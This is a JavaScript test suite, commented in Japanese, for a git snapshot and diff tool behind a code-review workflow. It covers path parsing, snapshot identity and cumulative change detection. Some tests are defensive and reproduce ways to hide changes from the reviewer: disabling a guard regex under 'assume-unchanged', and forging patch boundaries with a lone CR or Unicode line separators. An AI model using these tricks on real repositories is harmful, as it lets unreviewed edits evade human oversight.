    assert.ok(byPath.has(path), `C クォートされていない生のパスで入る: ${path}`);
    assert.equal(byPath.get(path).highRisk, true, `worker/ は高リスク: ${path}`);
  }
  assert.equal(
    byPath.get('docs/agent-workflows/レビュー手順.md').designDoc,
    true,
    '実行可能設計文書として判定される',
  );
  assert.ok(byPath.has('src/新規 ファイル.js'), '空白入りパスも1件として分離される');
});

test('AD-E: rename も -z で旧パス・新パスに分離される', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'src/日本語.js', 'export const a = 1;\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'add']);
  mkdirSync(join(dir, 'worker'), { recursive: true });
  sh(dir, ['mv', 'src/日本語.js', 'worker/認証.js']);
  sh(dir, ['commit', '-qm', 'rename']);

  const { changedFiles } = createSnapshot({ cwd: dir, baseRef: 'main' });
  const renamed = changedFiles.find((f) => f.path === 'worker/認証.js');
  assert.ok(renamed, '新パスで登録される');
  assert.equal(renamed.highRisk, true);
  // numstat の rename レコード（`add\tdel\t` の後に旧/新パスが続く）を新パスへ結び付ける分岐
  assert.equal(typeof renamed.additions, 'number', 'rename でも規模シグナルが落ちない');
});

// snapshotId は生成回の identity で、一意性の根拠は UUID のみ。連番・HEAD・dirty は
// 人間向けの接頭辞であり、index やディスクの状態から復元した値に一意性を負わせない
// （負わせると、それらが失われた時に消化済み snapshotId が再生成され、台帳の起動記録が
// 未レビューの diff を「実施済み」にする）
test('AD-B: index を失い接頭辞が完全一致しても、消化済み ID と衝突しない', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'src/a.js', 'export const a = 2;\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'c1']);
  const consumed = createSnapshot({ cwd: dir, baseRef: 'main' });
  assert.match(
    consumed.snapshotId,
    /^0001-[0-9a-f]+-[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/,
    '人間向け接頭辞 + UUID',
  );

  const root = reviewRoot(dir);
  writeFileSync(
    join(root, 'review-state.json'),
    JSON.stringify({
      version: 2,
      runs: [{ seq: 1, angle: 'subtractive', snapshotId: consumed.snapshotId, status: 'complete' }],
    }),
  );
  rmSync(join(root, 'index.json'));

  // HEAD も dirty 状態も変えない（接頭辞が完全に一致する最悪ケース）
  const next = createSnapshot({ cwd: dir, baseRef: 'main' });
  assert.notEqual(next.snapshotId, consumed.snapshotId, '消化済み ID を再生成しない');
  assert.equal(next.manifest.seq, 1, '表示用の連番は巻き戻る（安全性には効かない）');
  assert.ok(
    readFileSync(join(consumed.dir, 'base-to-current.patch'), 'utf-8').length > 0,
    '先行 snapshot の成果物が上書きされていない',
  );
});

test('AD-B: index.json の構造不正は破損と同じく fail-loud（silent フォールバックしない）', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'src/a.js', 'export const a = 2;\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'c1']);
  createSnapshot({ cwd: dir, baseRef: 'main' });

  writeFileSync(join(reviewRoot(dir), 'index.json'), '{"snapshots":null}');
  assert.throws(
    () => createSnapshot({ cwd: dir, baseRef: 'main' }),
    /snapshots が配列ではありません/,
  );
});

// 想定外のトークン列を break/continue で切り捨てると、残りの変更ファイルが changed-files から
// 黙って消える。これはこの PR が塞いだ「変更が分類器を素通りする」のと同じ失敗様式で、
// readIndex の構造不正・EEXIST と同じく fail-loud に揃える。
// LF を含むパス（敵対的レビュー F3）も同じ理由でレコードごと落としてはいけない
test('パーサ: -z 出力の異常形と改行入りパスを黙って落とさない', () => {
  assert.throws(
    () => parseNameStatus('M\0src/a.js\0R100\0src/old.js\0'),
    /--name-status -z の出力が想定外/,
    'rename の新パスが欠けた出力を黙って捨てない',
  );
  assert.throws(
    () => parseNumstat('1\t0\tsrc/a.js\0garbage\0'),
    /--numstat -z の出力が想定外/,
    '規模シグナルが黙って欠けない',
  );
  assert.throws(
    () => parseNumstat('1\t0\t\0src/old.js\0'),
    /--numstat -z の出力が想定外/,
    'rename の新パスが空でも parseNameStatus と同じく throw する',
  );
  // 正常系（末尾 NUL の空トークンを含む）は throw しない
  assert.deepEqual(parseNameStatus('M\0src/a.js\0'), [{ path: 'src/a.js', status: 'M' }]);
  assert.equal(parseNumstat('1\t0\tsrc/a.js\0').get('src/a.js').additions, 1);

  const NUL = String.fromCharCode(0); // \0 の直後に数字が来ると8進エスケープ扱いになる
  const stats = parseNumstat(`600\t0\tsrc/改行\nあり.js${NUL}600\t0\tsrc/plain.js${NUL}`);
  assert.equal(stats.get('src/改行\nあり.js')?.additions, 600, '改行入りパスも落ちない');
  assert.equal(stats.size, 2);
});

test('AD-E: クォートを強制するパスでも patch 見出しと changedFiles が突き合う', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const names = ['a"b.md', 'c\\d.md', 'e\tf.md', 'trail .md', 'tail.md ', '手順.md'];
  for (const n of names) write(dir, `docs/agent-workflows/${n}`, '# g\n\n- 既存\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'doc']);
  createSnapshot({ cwd: dir, baseRef: 'main' });

  for (const n of names) {
    write(dir, `docs/agent-workflows/${n}`, '# g\n\n- 既存\n- 必ず実行しなければならない\n');
  }
  sh(dir, ['commit', '-qam', 'rule']);
  const second = createSnapshot({ cwd: dir, baseRef: 'main' });

  const patch = readFileSync(join(second.dir, 'previous-to-current.patch'), 'utf-8');
  const inPatch = new Set(splitPatchByFile(patch).map((f) => f.path));
  for (const n of names) {
    assert.ok(inPatch.has(`docs/agent-workflows/${n}`), `patch 見出しが生に戻る: ${n}`);
  }
  assert.equal(second.manifest.semanticDocChangeInFix, true);
  // patch はレビュアーが読む正本なので、非 ASCII の見出しがエスケープされたままでは成果物として
  // 使えない（突き合わせは headerPath でも成立するが、可読性は core.quotepath でしか担保できない）
  assert.match(patch, /\+\+\+ b\/docs\/agent-workflows\/手順\.md/, '成果物に生のパスが出る');
});

test('headerPath: C クォートと TAB 区切りを解いて生のパスを返す', () => {
  assert.equal(headerPath('b/src/plain.js'), 'b/src/plain.js');
  assert.equal(headerPath('b/d/trail .md\t'), 'b/d/trail .md', 'TAB 区切りで終端する');
  assert.equal(headerPath('"b/a\\tb.md"'), 'b/a\tb.md');
  assert.equal(headerPath('"b/a\\"b.md"'), 'b/a"b.md');
  assert.equal(headerPath('"b/a\\\\b.md"'), 'b/a\\b.md');
  assert.equal(headerPath('"b/\\346\\227\\245.md"'), 'b/日.md', 'UTF-8 バイト列として復号する');
});

// headerPath も姉妹パーサ（parseNameStatus / parseNumstat）と同じく、想定外の
// C クォート形は黙って切り詰めず throw する（パス名の無音欠落＝変更が分類器を素通り）
test('headerPath: 不正な C クォートを黙って切り詰めず throw する', () => {
  assert.throws(
    () => headerPath('"b/a\\'),
    /エスケープ未完/,
    '末尾がエスケープ未完のバックスラッシュ',
  );
  assert.throws(() => headerPath('"b/a.md'), /閉じ引用符なし/, '閉じ引用符が無い');
});

// パス出力を変える git 設定は quotepath だけではない。relative=true は
// サブディレクトリ実行時にレビュー対象を部分木へ切り詰める（敵対的レビュー AD8-5・実測）
test('AD-E: diff.relative とサブディレクトリ実行でレビュー対象が切り詰められない', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  sh(dir, ['config', 'diff.relative', 'true']);
  write(dir, 'worker/auth.js', 'export const t = 1;\n');
  write(dir, 'src/deep/x.js', 'export const x = 1;\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'c1']);

  const { changedFiles, dir: snapDir } = createSnapshot({
    cwd: join(dir, 'src', 'deep'),
    baseRef: 'main',
  });
  const byPath = new Map(changedFiles.map((f) => [f.path, f]));
  assert.ok(byPath.has('worker/auth.js'), 'cwd の外のファイルが消えない');
  assert.equal(byPath.get('worker/auth.js').highRisk, true);
  assert.ok(byPath.has('src/deep/x.js'), 'パスがリポジトリ相対のまま');
  assert.match(
    readFileSync(join(snapDir, 'base-to-current.patch'), 'utf-8'),
    /worker\/auth\.js/,
    'patch 本文からも消えない',
  );
});

// 短縮 SHA の桁数は core.abbrev 次第で変わる。識別子の一意性がその桁数に依存していると、
// 設定ひとつで消化済み snapshotId が再生成される（敵対的レビュー AD8-1・実測）
test('AD-B: core.abbrev を短くしても識別子の一意性は変わらない', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  sh(dir, ['config', 'core.abbrev', '4']);
  write(dir, 'src/a.js', 'export const a = 2;\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'c1']);
  const consumed = createSnapshot({ cwd: dir, baseRef: 'main' });

  const root = reviewRoot(dir);
  rmSync(join(root, 'index.json'));
  rmSync(consumed.dir, { recursive: true });
  const next = createSnapshot({ cwd: dir, baseRef: 'main' });
  assert.notEqual(next.snapshotId, consumed.snapshotId);
});

// changedFilesBetween は「その系統が最後にレビューした snapshot → 現在」の累積差分を返す
// （review-plan の再探索基準）。ここが差分を過小に見せると、見送った hop の変更を
// その系統が一度も見ないまま収束できる — このファイルが塞いだのと同じ失敗様式。

test('changedFilesBetween: 途中 hop の変更を累積差分として返す', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const s1 = createSnapshot({ cwd: dir, baseRef: 'main' });

  write(dir, 'src/guard.js', 'export const re = /^[a-z]+$/;\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'guard']);
  createSnapshot({ cwd: dir, baseRef: 'main' });

  write(dir, 'docs/note.md', 'ただのメモ\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'docs']);
  const s3 = createSnapshot({ cwd: dir, baseRef: 'main' });

  const since = changedFilesBetween(dir, s1.snapshotId, s3.snapshotId);
  const paths = since.files.map((f) => f.path).sort();
  assert.deepEqual(paths, ['docs/note.md', 'src/guard.js']);
  assert.equal(since.guardChange, true, 's2 のガード変更が s1→s3 の累積差分に残る');
});

test('changedFilesBetween: untracked の追加・書き換え・削除を取りこぼさない', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const s1 = createSnapshot({ cwd: dir, baseRef: 'main' });

  // untracked のまま設計文書を足し、次の hop で内容を書き換える。commit 差分には一切現れない
  write(dir, 'docs/agent-workflows/new-flow.md', '# 手順\n\n1. 何もしない\n');
  const s2 = createSnapshot({ cwd: dir, baseRef: 'main' });
  write(dir, 'docs/agent-workflows/new-flow.md', '# 手順\n\n1. **必ず** 検証する\n');
  const s3 = createSnapshot({ cwd: dir, baseRef: 'main' });

  const added = changedFilesBetween(dir, s1.snapshotId, s2.snapshotId);
  assert.deepEqual(
    added.files.map((f) => f.path),
    ['docs/agent-workflows/new-flow.md'],
  );
  assert.equal(added.semanticDocChange, true, '内容が読めない設計文書は fail-closed');

  const rewritten = changedFilesBetween(dir, s2.snapshotId, s3.snapshotId);
  assert.deepEqual(
    rewritten.files.map((f) => f.path),
    ['docs/agent-workflows/new-flow.md'],
    'パスが同じでも内容ハッシュが変われば変更として現れる',
  );

  rmSync(join(dir, 'docs/agent-workflows/new-flow.md'));
  const s4 = createSnapshot({ cwd: dir, baseRef: 'main' });
  const removed = changedFilesBetween(dir, s3.snapshotId, s4.snapshotId);
  assert.deepEqual(
    removed.files.map((f) => [f.path, f.status]),
    [['docs/agent-workflows/new-flow.md', 'D']],
  );
});

test('changedFilesBetween: untracked → commit 済みへ移ったパスを削除として二重計上しない', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'src/staged.js', 'export const s = 1;\n');
  const s1 = createSnapshot({ cwd: dir, baseRef: 'main' });
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'commit the untracked file']);
  const s2 = createSnapshot({ cwd: dir, baseRef: 'main' });

  const since = changedFilesBetween(dir, s1.snapshotId, s2.snapshotId);
  assert.deepEqual(
    since.files.map((f) => [f.path, f.status]),
    [['src/staged.js', 'A']],
    'commit 差分の A だけが残り、存在しない D を足さない',
  );
});

test('changedFilesBetween: 基準が台帳に無い / 到達不能なら throw する（差分なしへ縮めない）', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const s1 = createSnapshot({ cwd: dir, baseRef: 'main' });

  assert.throws(
    () => changedFilesBetween(dir, '0099-deadbeef-nope', s1.snapshotId),
    /台帳にありません/,
  );

  const root = reviewRoot(dir);
  const indexPath = join(root, 'index.json');
  const index = JSON.parse(readFileSync(indexPath, 'utf-8'));
  index.snapshots[0].commit = '0'.repeat(40);
  writeFileSync(indexPath, JSON.stringify(index, null, 2));
  assert.throws(() => changedFilesBetween(dir, s1.snapshotId, s1.snapshotId), /到達不能/);
});

test('changedFilesBetween: assume-unchanged で隠された変更を累積差分から落とさない', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'scripts/agent/guard.js', 'export const RE = /^[a-z]+$/;\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'guard']);
  const s1 = createSnapshot({ cwd: dir, baseRef: 'main' });

  // 見送り round（tracked の変更なし）
  createSnapshot({ cwd: dir, baseRef: 'main' });

  // git に報告させないままガードを無効化する。commit にも untracked 台帳にも載らない
  sh(dir, ['update-index', '--assume-unchanged', 'scripts/agent/guard.js']);
  write(dir, 'scripts/agent/guard.js', 'export const RE = /.*/;\n');
  const s3 = createSnapshot({ cwd: dir, baseRef: 'main' });
  assert.equal(s3.manifest.guardChangeInFix, true, 'per-hop 側は fail-closed に倒れている');

  const since = changedFilesBetween(dir, s1.snapshotId, s3.snapshotId);
  assert.deepEqual(
    since.files.map((f) => f.path),
    ['scripts/agent/guard.js'],
  );
  assert.equal(since.guardChange, true, '累積経路でも fail-closed が外れない');
});

test('changedFilesBetween: 台帳の seq 破損・範囲内 entry の欠落を fail-loud にする', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const s1 = createSnapshot({ cwd: dir, baseRef: 'main' });
  write(dir, 'src/mid.js', 'export const m = 1;\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'mid']);
  createSnapshot({ cwd: dir, baseRef: 'main' });
  write(dir, 'src/last.js', 'export const l = 1;\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'last']);
  const s3 = createSnapshot({ cwd: dir, baseRef: 'main' });

  const indexPath = join(reviewRoot(dir), 'index.json');
  const original = readFileSync(indexPath, 'utf-8');
  const restore = () => writeFileSync(indexPath, original);

  // seq が無いと範囲比較が全件 false になり、未報告パスがエラーなく空になる
  const noSeq = JSON.parse(original);
  for (const e of noSeq.snapshots) delete e.seq;
  writeFileSync(indexPath, JSON.stringify(noSeq));
  assert.throws(() => changedFilesBetween(dir, s1.snapshotId, s3.snapshotId), /seq が不正です/);
  restore();

  // 2^53 以上は Number.isInteger を通るが採番が飽和する。範囲比較と採番で受理集合を割らない
  const huge = JSON.parse(original);
  huge.snapshots.at(-1).seq = Number.MAX_SAFE_INTEGER + 1;
  writeFileSync(indexPath, JSON.stringify(huge));
  assert.throws(() => changedFilesBetween(dir, s1.snapshotId, s3.snapshotId), /seq が不正です/);
  restore();

  // 中間 snapshot の entry ごと消えていても、from / to さえ引ければ静かに通ってしまう
  const gapped = JSON.parse(original);
  gapped.snapshots = gapped.snapshots.filter((e) => e.seq !== 2);
  writeFileSync(indexPath, JSON.stringify(gapped));
  assert.throws(() => changedFilesBetween(dir, s1.snapshotId, s3.snapshotId), /台帳の欠落/);
  restore();

  // manifest から unreportedPaths が消えると「検査対象が無かった」と区別できない
  const manifestPath = join(reviewRoot(dir), s3.snapshotId, 'manifest.json');
  const manifest = JSON.parse(readFileSync(manifestPath, 'utf-8'));
  delete manifest.unreportedPaths;
  writeFileSync(manifestPath, JSON.stringify(manifest));
  assert.throws(
    () => changedFilesBetween(dir, s1.snapshotId, s3.snapshotId),
    /unreportedPaths がありません/,
  );
});

test('changedFilesBetween: 台帳の untracked が壊れていたら fail-loud（無言で空扱いにしない）', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const s1 = createSnapshot({ cwd: dir, baseRef: 'main' });
  write(dir, 'scripts/agent/newguard.js', 'export const RE = /.*/;\n');
  const s2 = createSnapshot({ cwd: dir, baseRef: 'main' });

  const indexPath = join(reviewRoot(dir), 'index.json');
  const original = readFileSync(indexPath, 'utf-8');
  const withUntracked = changedFilesBetween(dir, s1.snapshotId, s2.snapshotId);
  assert.deepEqual(
    withUntracked.files.map((f) => f.path),
    ['scripts/agent/newguard.js'],
    '前提: 正常な台帳では untracked の追加が見える',
  );

  // 欠落・null・文字列。文字列は for-of が1文字ずつ回って偽のパスを作る
  for (const broken of [undefined, null, 'scripts/agent/newguard.js']) {
    const idx = JSON.parse(original);
    const entry = idx.snapshots.find((e) => e.snapshotId === s2.snapshotId);
    if (broken === undefined) delete entry.untracked;
    else entry.untracked = broken;
    writeFileSync(indexPath, JSON.stringify(idx));
    assert.throws(
      () => changedFilesBetween(dir, s1.snapshotId, s2.snapshotId),
      /untracked が配列ではありません/,
      `untracked=${JSON.stringify(broken)}`,
    );
  }
  writeFileSync(indexPath, original);
});

test('changedFilesBetween: untracked の内容を読み、無関係なファイルでガード変更を立てない', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const s1 = createSnapshot({ cwd: dir, baseRef: 'main' });
  createSnapshot({ cwd: dir, baseRef: 'main' }); // 見送り hop

  // 何の変哲もない untracked のメモ。per-hop 側は内容が読めるのでガード変更にならない
  write(dir, 'scratch.txt', 'todo: あとで消す\n');
  const s3 = createSnapshot({ cwd: dir, baseRef: 'main' });
  assert.equal(s3.manifest.guardChangeInFix, false, '前提: per-hop 側は guard を立てない');

  const since = changedFilesBetween(dir, s1.snapshotId, s3.snapshotId);
  assert.deepEqual(
    since.files.map((f) => f.path),
    ['scratch.txt'],
  );
  assert.equal(
    since.guardChange,
    false,
    '累積経路でも内容が読めるので、per-hop と受理集合が一致する',
  );
});

test('changedFilesBetween: untracked の実在する削除を基準の取り方で M に化けさせない', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  // 非通常ファイル（symlink）は unreportedPaths に載る＝合成 'M' が作られる経路
  symlinkSync('base.js', join(dir, 'link.js'));
  const s1 = createSnapshot({ cwd: dir, baseRef: 'main' });
  const s2 = createSnapshot({ cwd: dir, baseRef: 'main' });
  rmSync(join(dir, 'link.js'));
  const s3 = createSnapshot({ cwd: dir, baseRef: 'main' });

  const near = changedFilesBetween(dir, s2.snapshotId, s3.snapshotId);
  const far = changedFilesBetween(dir, s1.snapshotId, s3.snapshotId);
  const statusOf = (r) => r.files.find((f) => f.path === 'link.js')?.status;
  assert.equal(statusOf(near), 'D');
  assert.equal(statusOf(far), 'D', '同じ履歴に対し基準の取り方で status が変わらない');
});

test('changedFilesBetween: 中間 hop で入って消えた変更でトリガーを立てない（net-zero）', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const s1 = createSnapshot({ cwd: dir, baseRef: 'main' });

  // 見送った hop でガードを足し、次の hop で完全に元へ戻す
  write(dir, 'src/guard.js', 'export const RE = /^[a-z]+$/;\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'add guard']);
  createSnapshot({ cwd: dir, baseRef: 'main' });
  sh(dir, ['rm', '-q', 'src/guard.js']);
  sh(dir, ['commit', '-qm', 'revert guard']);
  const s3 = createSnapshot({ cwd: dir, baseRef: 'main' });

  const since = changedFilesBetween(dir, s1.snapshotId, s3.snapshotId);
  assert.deepEqual(since.files, [], '差し引きゼロなのでレビュー対象は無い');
  assert.equal(
    since.guardChange,
    false,
    'レビュー対象が1件も無いのにトリガーだけが立つと、全系統が最大コストのモードへ固定される',
  );
});

test('changedFilesBetween: 撤回された中間 hop の内容でトリガーを立てない', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'docs/notes.md', '# メモ\n\n本文\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'notes']);
  const s1 = createSnapshot({ cwd: dir, baseRef: 'main' });

  // 試作の構造行を足して、次の hop で撤回する（普通の試行錯誤）
  write(dir, 'docs/notes.md', '# メモ\n\n## 試作見出し\n\n本文\n');
  sh(dir, ['commit', '-qam', '試作']);
  createSnapshot({ cwd: dir, baseRef: 'main' });
  write(dir, 'docs/notes.md', '# メモ\n\n本文\n');
  sh(dir, ['commit', '-qam', '撤回']);
  createSnapshot({ cwd: dir, baseRef: 'main' });
  // 同じファイルの typo だけ直す（構造行も意味マーカーも動かさない）
  write(dir, 'docs/notes.md', '# メモ\n\n本文です\n');
  sh(dir, ['commit', '-qam', 'typo']);
  const s4 = createSnapshot({ cwd: dir, baseRef: 'main' });

  assert.equal(s4.manifest.semanticDocChangeInFix, false, '前提: per-hop 側は立てない');
  const since = changedFilesBetween(dir, s1.snapshotId, s4.snapshotId);
  assert.equal(
    since.semanticDocChange,
    false,
    '撤回済みの中間版は base-to-current.patch に無い＝起動されても理由を復元できない',
  );
});

test('changedFilesBetween: 範囲内で現れて消えた未報告パスを phantom として残さない', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const s1 = createSnapshot({ cwd: dir, baseRef: 'main' });

  // 作業用の untracked symlink（非通常ファイル＝unreportedPaths に載る）
  symlinkSync('src', join(dir, 'link-src'));
  const s2 = createSnapshot({ cwd: dir, baseRef: 'main' });
  assert.deepEqual(s2.manifest.unreportedPaths, ['link-src'], '前提: hop2 では未報告');

  rmSync(join(dir, 'link-src'));
  write(dir, 'src/x.js', 'export const x = 1;\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'c']);
  const s3 = createSnapshot({ cwd: dir, baseRef: 'main' });

  const since = changedFilesBetween(dir, s1.snapshotId, s3.snapshotId);
  assert.deepEqual(
    since.files.map((f) => f.path),
    ['src/x.js'],
    '両端点に存在しないパスを status M で提示しない（解消手段が無い恒久トリガーになる）',
  );
  assert.equal(since.guardChange, false);
});

test('changedFilesBetween: 孤立 CR で patch の chunk 境界を偽造できない', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const s1 = createSnapshot({ cwd: dir, baseRef: 'main' });

  // JS の `^`(multiline) は孤立 CR / U+2028 / U+2029 の直後にもマッチする。
  // 本文でそれを作れると chunk 境界を偽造でき、後半が解析不能になって無言で捨てられる
  for (const [label, sep] of [
    ['孤立 CR', '\r'],
    ['U+2028', '\u2028'],
    ['U+2029', '\u2029'],
  ]) {
    write(
      dir,
      'scripts/agent/note.txt',
      `todo\nX${sep}diff --git a/zz b/zz\nexport function validateAll(){return true;}\n`,
    );
    const snap = createSnapshot({ cwd: dir, baseRef: 'main' });
    const since = changedFilesBetween(dir, s1.snapshotId, snap.snapshotId);
    assert.equal(since.guardChange, true, `${label} で untracked の内容が判定器から消える`);
  }
});

test('changedFilesBetween / createSnapshot: 同一パスに status の違うエントリを作らない', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const dup = (files) => {
    const seen = new Set();
    return files.filter((f) => (seen.has(f.path) ? true : (seen.add(f.path), false)));
  };

  // untracked → commit（最も普通の操作）。per-hop 側が 'A' と 'D' を二重計上しないこと
  write(dir, 'src/staged.js', 'export const s = 1;\n');
  const s1 = createSnapshot({ cwd: dir, baseRef: 'main' });
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'commit it']);
  const s2 = createSnapshot({ cwd: dir, baseRef: 'main' });
  const perHop = JSON.parse(readFileSync(join(s2.dir, 'changed-files.json'), 'utf-8'));
  assert.deepEqual(dup(perHop.changedInFix), [], 'per-hop の修正差分に重複パスが無い');
  assert.deepEqual(
    perHop.changedInFix.map((f) => [f.path, f.status]),
    [['src/staged.js', 'A']],
  );

  // git rm --cached（誤コミットした生成物の untrack）。累積側が 'D'+'U' を作らないこと
  write(dir, 'docs/notes.md', '# メモ\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'notes']);
  const s3 = createSnapshot({ cwd: dir, baseRef: 'main' });
  sh(dir, ['rm', '--cached', '-q', 'docs/notes.md']);
  sh(dir, ['commit', '-qm', 'untrack']);
  const s4 = createSnapshot({ cwd: dir, baseRef: 'main' });
  const since = changedFilesBetween(dir, s3.snapshotId, s4.snapshotId);
  assert.deepEqual(dup(since.files), [], '累積差分に重複パスが無い');
  assert.equal(s1.snapshotId !== s4.snapshotId, true);
});

test('changedFilesBetween: untracked は範囲内で最後に載った内容で判定する', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const s1 = createSnapshot({ cwd: dir, baseRef: 'main' });

  // untracked のまま、ガードらしい内容を書いて次の hop で書き直す（コミットしない試行錯誤）
  write(dir, 'notes.txt', 'export function validate(x){ return /^[a-z]+$/.test(x); }\n');
  createSnapshot({ cwd: dir, baseRef: 'main' });
  write(dir, 'notes.txt', 'ただのメモ\n');
  const s3 = createSnapshot({ cwd: dir, baseRef: 'main' });

  const since = changedFilesBetween(dir, s1.snapshotId, s3.snapshotId);
  assert.deepEqual(
    since.files.map((f) => [f.path, f.status]),
    [['notes.txt', 'U']],
  );
  // 範囲内の全 hop を連結すると、既に書き換えられた中間版のガードで起動理由が作られる。
  // レビュアーが読むのは現在の内容なので、理由を復元できない
  assert.equal(since.guardChange, false, '判定に使うのは to 時点の内容');
});

test('changedFilesBetween: untrack して書き直したパスの新内容を落とさない', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'docs/guide.md', '# 手引き\n\n古い本文\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'guide']);
  const s1 = createSnapshot({ cwd: dir, baseRef: 'main' });

  // untrack しつつ同じパスを書き直す（誤コミットした生成物を untrack して直す等）
  sh(dir, ['rm', '--cached', '-q', 'docs/guide.md']);
  write(
    dir,
    'docs/guide.md',
    '# 手引き\n\n## 新ルール\n\nexport function validate(x){ return /^[a-z]+$/.test(x); }\n',
  );
  sh(dir, ['commit', '-qm', 'untrack']);
  createSnapshot({ cwd: dir, baseRef: 'main' });
  const s3 = createSnapshot({ cwd: dir, baseRef: 'main' });

  assert.ok(s3.manifest.untracked.includes('docs/guide.md'), '前提: ディスク上に実在する');
  const since = changedFilesBetween(dir, s1.snapshotId, s3.snapshotId);
  // 「files に何を載せるか」（1パス1エントリ）と「どの内容を判定器へ渡すか」は別の問い。
  // 同じ条件で絞ると、実在する新内容を誰も見ないまま収束する
  assert.equal(
    since.guardChange,
    true,
    'commit 差分に載らない現内容（to で untracked）は判定器へ渡す',
  );
});
